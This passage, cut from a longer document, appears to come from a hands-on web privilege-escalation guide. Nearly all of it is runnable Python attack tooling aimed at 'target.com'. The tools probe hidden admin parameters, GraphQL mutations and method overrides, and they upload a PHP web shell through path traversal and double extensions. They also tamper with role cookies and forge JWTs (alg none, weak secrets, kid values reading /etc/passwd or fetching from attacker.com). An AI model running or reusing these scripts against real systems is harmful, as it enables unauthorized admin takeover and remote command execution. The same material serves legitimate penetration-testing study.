    def test_hidden_parameters(self, endpoint):
        """Test for hidden admin parameters"""
        admin_params = [
            {'admin': '1'},
            {'admin': 'true'},
            {'isAdmin': 'true'},
            {'role': 'admin'},
            {'privilege': 'admin'},
            {'debug': '1'},
            {'test': '1'},
            {'dev': '1'},
        ]
        
        results = []
        
        for params in admin_params:
            response = self.session.get(f"{self.base_url}/{endpoint}", params=params)
            
            # Check if response differs
            if response.status_code == 200:
                if any(indicator in response.text.lower() 
                      for indicator in ['admin', 'privilege', 'delete', 'manage']):
                    print(f"[+] Hidden functionality found with params: {params}")
                    results.append({'endpoint': endpoint, 'params': params})
        
        return results

# Usage
discovery = FunctionDiscovery('http://target.com', 'user_session_token')

# Discover endpoints from JavaScript
endpoints = discovery.discover_js_endpoints()
print(f"\n[*] Found {len(endpoints)} endpoints:")
for endpoint in endpoints:
    print(f"  - {endpoint}")

# Test for hidden parameters
for endpoint in endpoints:
    discovery.test_hidden_parameters(endpoint)
```

### HTTP Method Override

**Testing different HTTP methods**:

```python
import requests

class HTTPMethodTester:
    def __init__(self, url, session_cookie=None):
        self.url = url
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
    
    def test_methods(self):
        """Test different HTTP methods"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        
        results = []
        
        for method in methods:
            try:
                response = self.session.request(method, self.url, timeout=5)
                
                print(f"[{response.status_code}] {method} {self.url}")
                
                if response.status_code not in [404, 405, 501]:
                    results.append({
                        'method': method,
                        'status': response.status_code,
                        'response': response.text[:200]
                    })
            except Exception as e:
                print(f"[-] {method} failed: {e}")
        
        return results
    
    def test_method_override(self):
        """Test HTTP method override headers"""
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-HTTP-Method-Override': 'DELETE'},
            {'X-Method-Override': 'PUT'},
            {'X-Method-Override': 'DELETE'},
            {'_method': 'PUT'},
            {'_method': 'DELETE'},
        ]
        
        results = []
        
        for headers in override_headers:
            # Send POST with override header
            response = self.session.post(self.url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Method override successful: {headers}")
                results.append({'headers': headers, 'response': response.text[:200]})
        
        # Test _method in POST data
        for method in ['PUT', 'DELETE', 'PATCH']:
            data = {'_method': method}
            response = self.session.post(self.url, data=data)
            
            if response.status_code == 200:
                print(f"[+] Method override via POST data: {data}")
                results.append({'data': data, 'response': response.text[:200]})
        
        return results

# Usage
tester = HTTPMethodTester('http://target.com/api/user/5', session_cookie='user_token')

# Test all HTTP methods
methods_results = tester.test_methods()

# Test method override
override_results = tester.test_method_override()

# Try DELETE with override to delete admin
tester_admin = HTTPMethodTester('http://target.com/api/user/1', session_cookie='user_token')
override_results_admin = tester_admin.test_method_override()
```

### API Version Exploitation

**Testing older API versions**:

```python
import requests

class APIVersionTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def test_versions(self, endpoint='/api/user/me'):
        """Test different API versions"""
        
        version_patterns = [
            '/api/v1{}',
            '/api/v2{}',
            '/api/v3{}',
            '/v1/api{}',
            '/v2/api{}',
            '/api{}',
            '/api/1.0{}',
            '/api/2.0{}',
            '/api/beta{}',
            '/api/alpha{}',
            '/api/test{}',
            '/api/dev{}',
            '/api/internal{}',
        ]
        
        results = []
        
        for pattern in version_patterns:
            url = self.base_url + pattern.format(endpoint)
            
            try:
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] [{response.status_code}] {url}")
                    print(f"    Response: {response.text[:150]}")
                    
                    results.append({
                        'url': url,
                        'status': response.status_code,
                        'data': response.json() if 'application/json' in response.headers.get('Content-Type', '') else response.text
                    })
            except:
                pass
        
        return results
    
    def test_admin_in_old_version(self):
        """Test if older versions have weaker access controls"""
        
        # Try accessing admin functionality in old versions
        admin_endpoints = [
            '/users',
            '/users/list',
            '/admin',
            '/admin/users',
            '/config',
            '/settings',
        ]
        
        versions = ['/api/v1', '/api/v2', '/v1/api', '/api']
        
        for version in versions:
            print(f"\n[*] Testing version: {version}")
            
            for endpoint in admin_endpoints:
                url = f"{self.base_url}{version}{endpoint}"
                
                try:
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        if any(indicator in response.text.lower() 
                              for indicator in ['admin', 'users', 'config', 'password']):
                            print(f"[+] Admin data accessible: {url}")
                            print(f"    Data: {response.text[:200]}")
                except:
                    pass

# Usage
api_tester = APIVersionTester('http://target.com', 'user_session_token')

# Test different API versions
results = api_tester.test_versions('/user/me')

# Test for admin access in old versions
api_tester.test_admin_in_old_version()
```

### GraphQL Introspection for Privilege Escalation

**GraphQL admin query discovery**:

```python
import requests
import json

class GraphQLExplorer:
    def __init__(self, graphql_url, session_cookie):
        self.url = graphql_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        self.headers = {'Content-Type': 'application/json'}
    
    def introspection_query(self):
        """Perform GraphQL introspection"""
        query = """
        {
          __schema {
            types {
              name
              fields {
                name
                args {
                  name
                  type {
                    name
                  }
                }
              }
            }
          }
        }
        """
        
        payload = {'query': query}
        response = self.session.post(self.url, 
                                    data=json.dumps(payload),
                                    headers=self.headers)
        
        if response.status_code == 200:
            return response.json()
        return None
    
    def find_admin_queries(self, schema):
        """Find admin-related queries and mutations"""
        admin_keywords = ['admin', 'delete', 'update', 'manage', 'privilege', 'role']
        
        admin_operations = []
        
        try:
            types = schema['data']['__schema']['types']
            
            for type_def in types:
                if type_def['fields']:
                    for field in type_def['fields']:
                        field_name = field['name'].lower()
                        
                        if any(keyword in field_name for keyword in admin_keywords):
                            print(f"[+] Found admin operation: {field['name']}")
                            admin_operations.append({
                                'type': type_def['name'],
                                'field': field['name'],
                                'args': field.get('args', [])
                            })
        except Exception as e:
            print(f"[-] Error parsing schema: {e}")
        
        return admin_operations
    
    def test_admin_query(self, operation):
        """Test admin operation as regular user"""
        field_name = operation['field']
        args = operation['args']
        
        # Build query with arguments
        if args:
            arg_strings = []
            for arg in args:
                arg_name = arg['name']
                arg_type = arg['type'].get('name', 'String')
                
                # Provide sample values based on type
                if 'Int' in str(arg_type):
                    arg_strings.append(f'{arg_name}: 1')
                elif 'Boolean' in str(arg_type):
                    arg_strings.append(f'{arg_name}: true')
                else:
                    arg_strings.append(f'{arg_name}: "test"')
            
            query = f"{{ {field_name}({', '.join(arg_strings)}) }}"
        else:
            query = f"{{ {field_name} }}"
        
        print(f"[*] Testing query: {query}")
        
        payload = {'query': query}
        response = self.session.post(self.url,
                                    data=json.dumps(payload),
                                    headers=self.headers)
        
        if response.status_code == 200:
            result = response.json()
            
            # Check if query succeeded
            if 'errors' not in result:
                print(f"[+] Admin query successful!")
                print(f"    Response: {json.dumps(result, indent=2)}")
                return True
            else:
                print(f"[-] Query failed: {result['errors'][0]['message']}")
        
        return False
    
    def test_mutations(self):
        """Test common admin mutations"""
        mutations = [
            'mutation { updateUserRole(userId: 1, role: "admin") }',
            'mutation { deleteUser(userId: 2) }',
            'mutation { promoteUser(userId: 5) }',
            'mutation { setAdmin(userId: 5, isAdmin: true) }',
            'mutation { updatePermissions(userId: 5, permissions: ["admin"]) }',
        ]
        
        for mutation in mutations:
            print(f"[*] Testing mutation: {mutation}")
            
            payload = {'query': mutation}
            response = self.session.post(self.url,
                                        data=json.dumps(payload),
                                        headers=self.headers)
            
            if response.status_code == 200:
                result = response.json()
                if 'errors' not in result:
                    print(f"[+] Mutation successful!")
                    print(f"    Response: {json.dumps(result, indent=2)}")

# Usage
graphql = GraphQLExplorer('http://target.com/graphql', 'user_session_token')

# Perform introspection
schema = graphql.introspection_query()

if schema:
    print("[+] GraphQL introspection successful")
    
    # Find admin operations
    admin_ops = graphql.find_admin_queries(schema)
    
    # Test each admin operation
    for op in admin_ops:
        graphql.test_admin_query(op)
    
    # Test common mutations
    graphql.test_mutations()
```

### File Upload for Privilege Escalation

**Overwriting admin configuration files**:

```python
import requests

class FileUploadEscalation:
    def __init__(self, upload_url, session_cookie):
        self.upload_url = upload_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def test_path_traversal_upload(self):
        """Test path traversal in file upload"""
        
        # Create malicious file
        malicious_content = b'<?php system($_GET["cmd"]); ?>'
        
        # Different path traversal techniques
        filenames = [
            '../../../var/www/html/shell.php',
            '..\\..\\..\\var\\www\\html\\shell.php',
            '....//....//....//var/www/html/shell.php',
            '../admin/shell.php',
            '../../config/admin.php',
        ]
        
        for filename in filenames:
            files = {'file': (filename, malicious_content, 'image/jpeg')}
            
            response = self.session.post(self.upload_url, files=files)
            
            print(f"[*] Uploaded: {filename}")
            print(f"    Status: {response.status_code}")
            
            if response.status_code == 200:
                # Try to access uploaded file
                test_paths = [
                    f'http://target.com/shell.php',
                    f'http://target.com/admin/shell.php',
                    f'http://target.com/uploads/../shell.php',
                ]
                
                for path in test_paths:
                    test_response = self.session.get(path)
                    if test_response.status_code == 200:
                        print(f"[+] Shell accessible at: {path}")
    
    def test_config_overwrite(self):
        """Attempt to overwrite configuration files"""
        
        # Malicious config content
        config_content = b'''<?php
$admin_users = array('attacker');
$user_roles = array('attacker' => 'admin');
?>'''
        
        config_filenames = [
            '../config.php',
            '../../config/app.php',
            '../settings.ini',
            '../.env',
        ]
        
        for filename in config_filenames:
            files = {'file': (filename, config_content, 'application/octet-stream')}
            
            response = self.session.post(self.upload_url, files=files)
            
            if response.status_code == 200:
                print(f"[+] Potentially overwrote: {filename}")
    
    def test_double_extension(self):
        """Test double extension bypass"""
        
        shell_content = b'<?php system($_GET["cmd"]); ?>'
        
        double_extensions = [
            'shell.php.jpg',
            'shell.php.png',
            'shell.php.txt',
            'shell.jpg.php',
            'shell.php%00.jpg',  # Null byte
            'shell.php\x00.jpg',
        ]
        
        for filename in double_extensions:
            files = {'file': (filename, shell_content, 'image/jpeg')}
            response = self.session.post(self.upload_url, files=files)
            
            if response.status_code == 200:
                print(f"[*] Uploaded: {filename}")
                
                # Try accessing without image extension
                test_url = f"http://target.com/uploads/{filename.split('.')[0]}.php"
                test_response = self.session.get(test_url)
                
                if test_response.status_code == 200:
                    print(f"[+] Shell accessible: {test_url}")

# Usage
uploader = FileUploadEscalation('http://target.com/upload', 'user_session_token')

uploader.test_path_traversal_upload()
uploader.test_config_overwrite()
uploader.test_double_extension()
```

## Role Manipulation

### Direct Role Assignment

**POST/PUT requests to modify roles**:

```python
import requests
import json

class RoleManipulator:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def test_direct_role_change(self, user_id=None):
        """Attempt to directly change user role"""
        
        endpoints = [
            '/api/user/update',
            '/api/user/profile',
            '/api/account/update',
            '/update-profile',
            '/user/edit',
        ]
        
        role_parameters = [
            {'role': 'admin'},
            {'role': 'administrator'},
            {'user_role': 'admin'},
            {'account_type': 'admin'},
            {'privilege': 'admin'},
            {'access_level': 'admin'},
            {'is_admin': True},
            {'isAdmin': 'true'},
            {'admin': 1},
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            for params in role_parameters:
                # Test with JSON
                headers = {'Content-Type': 'application/json'}
                response = self.session.post(url, 
                                            data=json.dumps(params),
                                            headers=headers)
                
                if response.status_code in [200, 201]:
                    print(f"[*] Testing: {url} with {params}")
                    print(f"    Response: {response.text[:200]}")
                    
                    # Verify if role changed
                    verify = self.session.get(f"{self.base_url}/api/user/me")
                    if 'admin' in verify.text.lower():
                        print(f"[+] Role escalation successful!")
                        return True
                
                # Test with form data
                response = self.session.post(url, data=params)
                
                if response.status_code in [200, 201]:
                    verify = self.session.get(f"{self.base_url}/api/user/me")
                    if 'admin' in verify.text.lower():
                        print(f"[+] Role escalation successful with form data!")
                        return True
        
        return False
    
    def test_role_array_manipulation(self):
        """Test role manipulation via arrays"""
        
        payloads = [
            {'roles': ['admin']},
            {'roles': ['user', 'admin']},
            {'permissions': ['read', 'write', 'admin']},
            {'groups': ['admin']},
            {'capabilities': ['admin', 'superuser']},
        ]
        
        url = f"{self.base_url}/api/user/update"
        headers = {'Content-Type': 'application/json'}
        
        for payload in payloads:
            response = self.session.post(url,
                                        data=json.dumps(payload),
                                        headers=headers)
            
            if response.status_code == 200:
                print(f"[*] Tested payload: {payload}")
                
                # Verify
                verify = self.session.get(f"{self.base_url}/api/user/me")
                if 'admin' in verify.text.lower():
                    print(f"[+] Escalation via array: {payload}")
                    return True
        
        return False

# Usage
role_manipulator = RoleManipulator('http://target.com', 'user_session_token')

# Test direct role changes
role_manipulator.test_direct_role_change()

# Test array manipulation
role_manipulator.test_role_array_manipulation()
```

### Cookie-Based Role Manipulation

**Modifying role in cookies**:

```python
import requests
import base64
import json

class CookieRoleManipulator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def login(self, username, password):
        """Login and capture cookies"""
        response = self.session.post(f"{self.base_url}/login",
                                    data={'username': username, 'password': password})
        
        print("[*] Current cookies:")
        for cookie in self.session.cookies:
            print(f"    {cookie.name} = {cookie.value}")
    
    def manipulate_session_cookie(self):
        """Attempt to manipulate session cookie"""
        
        for cookie in self.session.cookies:
            original_value = cookie.value
            print(f"\n[*] Analyzing cookie: {cookie.name}")
            print(f"    Original: {original_value}")
            
            # Try base64 decoding
            try:
                decoded = base64.b64decode(original_value)
                print(f"    Decoded: {decoded}")
                
                # Try JSON parsing
                try:
                    session_data = json.loads(decoded)
                    print(f"    JSON: {json.dumps(session_data, indent=2)}")
                    
                    # Modify role
                    if 'role' in session_data:
                        session_data['role'] = 'admin'
                    if 'is_admin' in session_data:
                        session_data['is_admin'] = True
                    if 'privilege' in session_data:
                        session_data['privilege'] = 'administrator'
                    
                    # Re-encode
                    modified_json = json.dumps(session_data)
                    modified_value = base64.b64encode(modified_json.encode()).decode()
                    
                    print(f"    Modified: {modified_value}")
                    
                    # Test modified cookie
                    self.session.cookies.set(cookie.name, modified_value)
                    
                    response = self.session.get(f"{self.base_url}/admin")
                    
                    if response.status_code == 200:
                        print(f"[+] Admin access with modified cookie!")
                        return True
                
                except json.JSONDecodeError:
                    # Not JSON, try string manipulation
                    decoded_str = decoded.decode('utf-8', errors='ignore')
                    
                    # Replace role indicators
                    modifications = [
                        decoded_str.replace('user', 'admin'),
                        decoded_str.replace('role:user', 'role:admin'),
                        decoded_str.replace('r:0', 'r:1'),  # role flag
                    ]
                    
                    for modified in modifications:
                        modified_value = base64.b64encode(modified.encode()).decode()
                        self.session.cookies.set(cookie.name, modified_value)
                        
                        response = self.session.get(f"{self.base_url}/admin")
                        if response.status_code == 200:
                            print(f"[+] Admin access with modified cookie!")
                            return True
            
            except Exception as e:
                # Try direct string manipulation without decoding
                modifications = [
                    original_value.replace('user', 'admin'),
                    original_value.replace('0', '1'),
                    original_value.replace('false', 'true'),
                ]
                
                for modified in modifications:
                    self.session.cookies.set(cookie.name, modified)
                    response = self.session.get(f"{self.base_url}/admin")
                    
                    if response.status_code == 200:
                        print(f"[+] Admin access with modified cookie: {modified}")
                        return True
        
        return False
    
    def test_role_cookie_injection(self):
        """Test adding new role-related cookies"""
        
        role_cookies = [
            {'name': 'role', 'value': 'admin'},
            {'name': 'is_admin', 'value': 'true'},
            {'name': 'user_role', 'value': 'administrator'},
            {'name': 'privilege', 'value': 'admin'},
            {'name': 'admin', 'value': '1'},
        ]
        
        for cookie_data in role_cookies:
            self.session.cookies.set(cookie_data['name'], cookie_data['value'])
            
            response = self.session.get(f"{self.base_url}/admin")
            
            if response.status_code == 200:
                print(f"[+] Admin access via injected cookie: {cookie_data}")
                return True
        
        return False

# Usage
cookie_manipulator = CookieRoleManipulator('http://target.com')
cookie_manipulator.login('user1', 'password123')

# Manipulate existing cookies
cookie_manipulator.manipulate_session_cookie()

# Inject new role cookies
cookie_manipulator.test_role_cookie_injection()
```

### JWT Role Manipulation

**Comprehensive JWT role exploitation**:

```python
import jwt
import json
import base64
import hmac
import hashlib

class JWTRoleExploit:
    def __init__(self, token):
        self.original_token = token
        self.header = None
        self.payload = None
        self.signature = None
        self.decode_token()
    
    def decode_token(self):
        """Decode JWT without verification"""
        try:
            parts = self.original_token.split('.')
            
            # Decode header
            self.header = json.loads(
                base64.urlsafe_b64decode(parts[0] + '==')
            )
            
            # Decode payload
            self.payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + '==')
            )
            
            self.signature = parts[2]
            
            print("[*] Original Token:")
            print(f"    Header: {json.dumps(self.header, indent=2)}")
            print(f"    Payload: {json.dumps(self.payload, indent=2)}")
        
        except Exception as e:
            print(f"[-] Error decoding token: {e}")
    
    def none_algorithm_attack(self):
        """Attack 1: None algorithm bypass"""
        print("\n[*] Testing None algorithm attack...")
        
        # Modify payload
        modified_payload = self.payload.copy()
        if 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        if 'is_admin' in modified_payload:
            modified_payload['is_admin'] = True
        
        modified_payload['admin'] = True
        
        # Set algorithm to none
        modified_header = self.header.copy()
        modified_header['alg'] = 'none'
        
        # Encode
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(modified_header).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(modified_payload).encode()
        ).decode().rstrip('=')
        
        # No signature for 'none' algorithm
        none_token = f"{header_encoded}.{payload_encoded}."
        
        print(f"[+] None algorithm token: {none_token}")
        return none_token
    
    def weak_secret_attack(self):
        """Attack 2: Weak secret brute force"""
        print("\n[*] Testing weak secret brute force...")
        
        # Common weak secrets
        weak_secrets = [
            'secret', 'password', 'key', 'admin', 'test',
            '123456', 'qwerty', 'letmein', 'default',
            'jwt_secret', 'your-256-bit-secret', 'secret_key',
            '', 'null', 'undefined'
        ]
        
        modified_payload = self.payload.copy()
        if 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        modified_payload['admin'] = True
        
        forged_tokens = []
        
        for secret in weak_secrets:
            try:
                token = jwt.encode(modified_payload, secret, algorithm='HS256')
                forged_tokens.append({'secret': secret, 'token': token})
                print(f"[*] Generated token with secret '{secret}': {token[:50]}...")
            except:
                pass
        
        return forged_tokens
    
    def algorithm_confusion_attack(self):
        """Attack 3: Algorithm confusion (RS256 to HS256)"""
        print("\n[*] Testing algorithm confusion attack...")
        
        # This requires the public key from the server
        # Assuming we have it as RSA_PUBLIC_KEY
        
        modified_payload = self.payload.copy()
        if 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        modified_payload['admin'] = True
        
        # Change algorithm from RS256 to HS256
        modified_header = self.header.copy()
        modified_header['alg'] = 'HS256'
        
        print("[*] Algorithm confusion requires server's public key")
        print("[*] Token would be signed with public key as HMAC secret")
        
        return None
    
    def kid_manipulation(self):
        """Attack 4: Key ID (kid) manipulation"""
        print("\n[*] Testing kid parameter manipulation...")
        
        if 'kid' not in self.header:
            print("[-] No 'kid' parameter in header")
            return []
        
        malicious_kids = [
            '/dev/null',  # Empty file
            '../../dev/null',
            '/proc/self/environ',
            '../../../etc/passwd',
            'http://attacker.com/key.pem',  # Remote key
        ]
        
        tokens = []
        
        for kid in malicious_kids:
            modified_header = self.header.copy()
            modified_header['kid'] = kid
            
            modified_payload = self.payload.copy()
            if 'role' in modified_payload:
                modified_payload['role'] = 'admin'
            
            # Encode (signature will be invalid but might bypass checks)
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')
            
            token = f"{header_encoded}.{payload_encoded}.{self.signature}"
            tokens.append({'kid': kid, 'token': token})
            
            print(f"[*] Token with kid='{kid}': {token[:50]}...")
        
        return tokens
    
    def test_all_attacks(self, test_url):
        """Test all JWT attacks against target"""
        import requests
        
        print(f"\n[*] Testing attacks against: {test_url}")
        
        attacks = {
            'none_algorithm': self.none_algorithm_attack(),
            'weak_secrets': self.weak_secret_attack(),
            'kid_manipulation': self.kid_manipulation(),
        }
        
        # Test none algorithm
        if attacks['none_algorithm']:
            headers = {'Authorization': f"Bearer {attacks['none_algorithm']}"}
            response = requests.get(test_url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] None algorithm attack successful!")
                return attacks['none_algorithm']
        
        # Test weak secrets
        for token_data in attacks['weak_secrets']:
            headers = {'Authorization': f"Bearer {token_data['token']}"}
            response = requests.get(test_url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Weak secret attack successful with secret: {token_data['secret']}")
                return token_data['token']
        
        # Test kid manipulation
        for token_data in attacks['kid_manipulation']:
            headers = {'Authorization': f"Bearer {token_data['token']}"}
            response = requests.get(test_url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Kid manipulation successful: {token_data['kid']}")
                return token_data['token']
        
        print("[-] All attacks failed")
        return None

# Usage
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1LCJyb2xlIjoidXNlciJ9.signature"

jwt_exploit = JWTRoleExploit(original_token)

# Test individual attacks
none_token = jwt_exploit.none_algorithm_attack()
weak_tokens = jwt_exploit.weak_secret_attack()
kid_tokens = jwt_exploit.kid_manipulation()

# Test all attacks against actual endpoint
admin_token = jwt_exploit.test_all_attacks('http://target.com/api/admin')
```

### OAuth/SAML Role Manipulation

**OAuth token manipulation**:

```python
import requests
import json
import base64

class OAuthRoleManipulator:
    def __init__(self, auth_server, client_id, redirect_uri):
        self.auth_server = auth_server
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.session = requests.Session()
    
    def intercept_and_modify_token(self, access_token):
        """Modify OAuth access token (if not properly signed)"""
        
        # Some OAuth implementations use JWT for access tokens
        try:
            parts = access_token.split('.')
            if len(parts) == 3:
                # It's a JWT
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                
                print(f"[*] Token payload: {json.dumps(payload, indent=2)}")
                
                # Modify role/scope
                if 'scope' in payload:
                    payload['scope'] += ' admin'
                if 'role' in payload:
                    payload['role'] = 'admin'
                
                # Try none algorithm
                header = {'alg': 'none', 'typ': 'JWT'}
                
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                
                modified_token = f"{header_encoded}.{payload_encoded}."
                
                print(f"[+] Modified token: {modified_token}")
                return modified_token
        
        except:
            pass
        
        return access_token
    
    def scope_escalation(self):
        """Request elevated scopes during OAuth flow"""
        
        # Authorization request with admin scope
        escalated_scopes = [
            'admin',
            'administrator',
            'superuser',
            'read write admin',
            'user admin',
            '*',  # Wildcard scope
        ]
        
        for scope in escalated_scopes:
            params = {
                'client_id': self.client_id,
                'redirect_uri': self.redirect_uri,
                'response_type': 'code',
                'scope': scope
            }
            
            response = self.session.get(f"{self.auth_server}/authorize", params=params)
            
            print(f"[*] Testing scope: {scope}")
            print(f"    Status: {response.status_code}")
            
            if 'code=' in response.url:
                print(f"[+] Authorization granted with scope: {scope}")

# Usage
oauth_manipulator = OAuthRoleManipulator(
    'https://auth.target.com',
    'client_id_123',
    'http://target.com/callback'
)

# Test scope escalation
oauth_manipulator.scope_escalation()
```

### Complete Privilege Escalation Testing Framework

**Automated privilege escalation tester**:

```python
#!/usr/bin/env python3
import requests
import json
import argparse
from urllib.parse import urljoin

class PrivilegeEscalationTester:
    def __init__(self, base_url, username, password, verbose=False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.verbose = verbose
        self.username = username
        self.password = password
        self.vulnerabilities = []
    
    def log(self, message, level='info'):
        if self.verbose or level in ['success', 'vuln']:
            prefix = {
                'info': '[*]',
                'success': '[+]',
                'vuln': '[!]',
                'error': '[-]',
            }.get(level, '[*]')
            print(f"{prefix} {message}")
    
    def login(self):
        """Perform login"""
        self.log("Attempting login...")
        
        response = self.session.post(
            f"{self.base_url}/login",
            data={'username': self.username, 'password': self.password}
        )
        
        if response.status_code == 200 or 'dashboard' in response.text.lower():
            self.log("Login successful", 'success')
            return True
        
        self.log("Login failed", 'error')
        return False
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        self.log("\n=== Testing for IDOR ===")
        
        endpoints = [
            '/api/user/{}',
            '/profile?id={}',
            '/user/{}',
            '/account/{}',
        ]
        
        for endpoint in endpoints:
            # Test accessing admin user (ID 1)
            url = urljoin(self.base_url, endpoint.format('1'))
            response = self.session.get(url)
            
            if response.status_code == 200:
                if any(keyword in response.text.lower() 
                      for keyword in ['admin', 'administrator', 'root']):
                    self.log(f"IDOR vulnerability found: {url}", 'vuln')
                    self.vulnerabilities.append({
                        'type': 'IDOR',
                        'url': url,
                        'description': 'Can access admin user data'
                    })
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        self.log("\n=== Testing for Mass Assignment ===")
        
        update_endpoints = [
            '/api/user/update',
            '/profile/update',
            '/account/update',
        ]
        
        injection_fields = [
            {'role': 'admin'},
            {'isAdmin': True},
            {'privilege': 'administrator'},
        ]
        
        for endpoint in update_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for fields in injection_fields:
                payload = {'email': 'test@test.com'}
                payload.update(fields)
                
                headers = {'Content-Type': 'application/json'}
                response = self.session.post(url,
                                            data=json.dumps(payload),
                                            headers=headers)
                
                if response.status_code == 200:
                    # Verify if escalation worked
                    verify = self.session.get(f"{self.base_url}/api/user/me")
                    
                    if 'admin' in verify.text.lower():
                        self.log(f"Mass assignment vulnerability: {url} with {fields}", 'vuln')
                        self.vulnerabilities.append({
                            'type': 'Mass Assignment',
                            'url': url,
                            'fields': fields,
                            'description': 'Can inject admin role'
                        })
                        return True
        
        return False
    
    def test_hidden_endpoints(self):
        """Test for hidden admin endpoints"""
        self.log("\n=== Testing for Hidden Admin Endpoints ===")
        
        admin_paths = [
            'admin', 'administrator', 'admin/', 'admin/dashboard',
            'manage', 'management', 'control', 'panel',
            'api/admin', 'api/administrator',
        ]
        
        for path in admin_paths:
            url = urljoin(self.base_url, path)
            response = self.session.get(url)
            
            if response.status_code == 200:
                self.log(f"Accessible admin endpoint: {url}", 'vuln')
                self.vulnerabilities.append({
                    'type': 'Hidden Admin Endpoint',
                    'url': url,
                    'description': 'Admin endpoint accessible by regular user'
                })
    
    def test_http_methods(self):
        """Test HTTP method override"""
        self.log("\n=== Testing HTTP Method Override ===")
        
        test_url = urljoin(self.base_url, '/api/user/1')  # Admin user
        
        # Test different methods
        methods = ['PUT', 'DELETE', 'PATCH']
        
        for method in methods:
            response = self.session.request(method, test_url)
            
            if response.status_code in [200, 204]:
                self.log(f"{method} method accessible on admin user endpoint", 'vuln')
                self.vulnerabilities.append({
                    'type': 'HTTP Method Override',
                    'url': test_url,
                    'method': method,
                    'description': f'{method} method not properly restricted'
                })
        
        # Test method override headers
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-HTTP-Method-Override': 'DELETE'},
            {'X-Method-Override': 'DELETE'},
        ]
        
        for headers in override_headers:
            response = self.session.post(test_url, headers=headers)
            
            if response.status_code in [200, 204]:
                self.log(f"Method override successful: {headers}", 'vuln')
                self.vulnerabilities.append({
                    'type': 'HTTP Method Override',
                    'url': test_url,
                    'headers': headers,
                    'description': 'Method override via headers'
                })
    
    def test_cookie_manipulation(self):
        """Test cookie-based role manipulation"""
        self.log("\n=== Testing Cookie Manipulation ===")
        
        original_cookies = dict(self.session.cookies)
        
        for cookie_name, cookie_value in original_cookies.items():
            self.log(f"Testing cookie: {cookie_name}")
            
            # Try base64 decoding
            try:
                import base64
                decoded = base64.b64decode(cookie_value)
                
                try:
                    session_data = json.loads(decoded)
                    
                    # Modify role
                    modified_data = session_data.copy()
                    modified_data['role'] = 'admin'
                    modified_data['is_admin'] = True
                    
                    modified_value = base64.b64encode(
                        json.dumps(modified_data).encode()
                    ).decode()
                    
                    self.session.cookies.set(cookie_name, modified_value)
                    
                    # Test admin access
                    response = self.session.get(f"{self.base_url}/admin")
                    
                    if response.status_code == 200:
                        self.log(f"Cookie manipulation successful: {cookie_name}", 'vuln')
                        self.vulnerabilities.append({
                            'type': 'Cookie Manipulation',
                            'cookie': cookie_name,
                            'description': 'Role can be modified in cookie'
                        })
                        return True
                
                except:
                    pass
            except:
                pass
            
            # Restore original cookie
            self.session.cookies.set(cookie_name, cookie_value)
        
        # Try injecting new role cookies
        role_cookies = [
            ('role', 'admin'),
            ('is_admin', 'true'),
            ('admin', '1'),
        ]
        
        for name, value in role_cookies:
            self.session.cookies.set(name, value)
            response = self.session.get(f"{self.base_url}/admin")
            
            if response.status_code == 200:
                self.log(f"Role cookie injection successful: {name}={value}", 'vuln')
                self.vulnerabilities.append({
                    'type': 'Cookie Injection',
                    'cookie': f"{name}={value}",
                    'description': 'Admin access via injected cookie'
                })
                return True
    
    def test_jwt_manipulation(self):
        """Test JWT token manipulation"""
        self.log("\n=== Testing JWT Manipulation ===")
        
        # Check for JWT in Authorization header or cookies
        jwt_token = None
        
        # Check Authorization header
        if 'Authorization' in self.session.headers:
            auth_header = self.session.headers['Authorization']
            if 'Bearer' in auth_header:
                jwt_token = auth_header.split('Bearer ')[1]
        
        # Check cookies for JWT
        for cookie in self.session.cookies:
            value = cookie.value
            if value.count('.') == 2:  # JWT format
                jwt_token = value
                break
        
        if not jwt_token:
            self.log("No JWT token found")
            return False
        
        self.log(f"Found JWT token: {jwt_token[:50]}...")
        
        try:
            import base64
            
            parts = jwt_token.split('.')
            
            # Decode payload
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            self.log(f"JWT Payload: {json.dumps(payload, indent=2)}")
            
            # Test none algorithm
            modified_payload = payload.copy()
